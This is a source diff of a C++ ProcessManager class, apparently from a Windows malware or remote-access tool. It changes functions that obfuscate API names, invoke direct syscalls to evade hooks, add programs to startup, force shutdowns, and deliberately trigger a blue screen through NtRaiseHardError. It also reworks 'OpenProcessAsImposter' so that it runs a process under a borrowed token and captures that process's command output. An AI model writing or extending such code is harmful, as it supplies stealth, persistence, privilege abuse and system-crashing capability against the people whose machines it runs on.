@@ -77,7 +77,7 @@ HMODULE ProcessManager::GetLoadedModule(std::string libName)
     return NULL;
 }
 
-HMODULE ProcessManager::GetLoadedLib(std::string libName) {
+HMODULE ProcessManager::GetLoadedLib(const std::string& libName) {
     if ( this->m_LoadedDLLs.count(_lower(libName)) > 0 ) {
         return this->m_LoadedDLLs.at(_lower(libName));
     }
@@ -85,7 +85,7 @@ HMODULE ProcessManager::GetLoadedLib(std::string libName) {
     return GetLoadedModule(libName);
 }
 
-BOOL ProcessManager::FreeUsedLibrary(std::string lib) {
+BOOL ProcessManager::FreeUsedLibrary(const std::string& lib) {
     if ( this->m_LoadedDLLs.find(_lower(lib).c_str()) == this->m_LoadedDLLs.end() )
         return FALSE;
 
@@ -247,13 +247,13 @@ void ProcessManager::AddProcessToStartup(std::string path) {
 }
 
 void ProcessManager::ShutdownSystem(SHUTDOWN_ACTION type) {
-    BOOLEAN state;
+    BOOLEAN state = FALSE;
 
     GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtRevertContainerImpersonation"));
     SysNtRevertContainerImpersonation();
 
     ::_RtlAdjustPrivilege adjust = GetFunctionAddress<::_RtlAdjustPrivilege>(NTDLL, ( char* ) HIDE("RtlAdjustPrivilege"));
-    adjust(19, TRUE, FALSE, &state);
+    NTSTATUS adjusted = adjust(19, TRUE, FALSE, &state);
     
     GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtShutdownSystem"));
     SysNtShutdownSystem(type);
@@ -269,18 +269,8 @@ void ProcessManager::BSOD() {
     ::_RtlAdjustPrivilege adjust = GetFunctionAddress<::_RtlAdjustPrivilege>(NTDLL, (char*)HIDE("RtlAdjustPrivilege"));
     adjust(19, TRUE, FALSE, &state);
 
-    // can be random
-    std::array<unsigned int, 10> stopCodes = { 
-        0x00000093, 0x00000077, 0x000000EF, 0x0000001A, 0x00000028,
-        0x00000051, 0x00000053, 0x0000005A, 0x0000007B, 0x00000085
-    };
-
-    std::random_device gen;
-    std::mt19937 rng(gen());
-    std::uniform_int_distribution<std::mt19937::result_type> dist(0, 9);
-
     GetAndInsertSSN(NTDLL, ( char* ) HIDE("NtRaiseHardError"));
-    SysNtRaiseHardError(stopCodes.at(dist(rng)), 0, 0, 0, 6, &resp);
+    SysNtRaiseHardError(STATUS_ACCESS_VIOLATION, 0, 0, 0, 6, &resp);
 }
 
 void ProcessManager::LoadAllNatives() {
@@ -415,11 +405,29 @@ BOOL ProcessManager::OpenProcessAsImposter(
     DWORD dwCreationFlags,
     LPVOID lpEnvironment,
     LPCWSTR lpCurrentDirectory,
-    LPSTARTUPINFOW lpStartupInfo,
-    LPPROCESS_INFORMATION lpProcessInformation
+    bool saveOutput,
+    std::string& cmdOutput
 ) {
+    HANDLE              readFrom = nullptr, writeTo = nullptr; // read from and write to, std buffers
+    STARTUPINFO         si = {};
+    PROCESS_INFORMATION pi = {};
+    SECURITY_ATTRIBUTES sa = {};
+    sa.bInheritHandle = TRUE;
+    sa.lpSecurityDescriptor = nullptr;
+    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
 
-    return GetNative<_CreateProcessWithTokenW>((char*) HIDE("CreateProcessWithTokenW")).call(
+    if ( saveOutput ) {
+        CreatePipe(&readFrom, &writeTo, &sa, 0);
+        SetHandleInformation(readFrom, HANDLE_FLAG_INHERIT, 0);
+
+        si.cb         = sizeof(STARTUPINFO);
+        si.dwFlags    = STARTF_USESTDHANDLES;
+        si.hStdOutput = writeTo;
+        si.hStdError  = writeTo;
+        si.hStdInput  = nullptr;
+    }
+
+    GetNative<::_CreateProcessWithTokenW>(( char* ) HIDE("CreateProcessWithTokenW")).call(
         token,
         dwLogonFlags,
         lpApplicationName,
@@ -427,12 +435,33 @@ BOOL ProcessManager::OpenProcessAsImposter(
         dwCreationFlags,
         lpEnvironment,
         lpCurrentDirectory,
-        lpStartupInfo,
-        lpProcessInformation
+        &si,
+        &pi
     );
+
+    if ( !saveOutput )
+        return TRUE;
+
+    GetAndInsertSSN(NTDLL, (char*)HIDE("NtClose"));
+    SysNtClose(writeTo);
+
+    char        buffer[4096];
+    DWORD       bytesRead = 0;
+
+    while ( ReadFile(readFrom, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0 ) {
+        buffer[bytesRead] = '\0';
+        cmdOutput.append(buffer);
+    }
+    
+    cmdOutput.erase(cmdOutput.rfind('\n'));
+
+    GetAndInsertSSN(NTDLL, (char*)HIDE("NtClose"));
+    SysNtClose(readFrom);
+
+    return TRUE;
 }
 
-DWORD ProcessManager::StartWindowsService(std::string serviceName) {
+DWORD ProcessManager::StartWindowsService(const std::string& serviceName) {
     SC_HANDLE scManager = GetNative<_OpenSCManagerW>((char*)HIDE("OpenSCManagerW")).call( nullptr, SERVICES_ACTIVE_DATABASE, GENERIC_EXECUTE );
     if ( scManager == NULL )
         return -1;
